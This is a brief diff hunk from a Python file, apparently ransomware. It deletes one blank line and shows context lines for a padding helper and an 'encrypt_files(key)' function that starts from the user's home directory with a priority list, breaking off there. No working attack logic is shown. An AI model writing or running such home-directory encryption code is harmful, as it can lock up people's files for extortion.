@@ -20,7 +20,6 @@ def pad(data):
         data += b' '
     return data
 
-
 def encrypt_files(key):
     main = os.path.expanduser('~')                                                                                                                                                                                   
     priority = [  
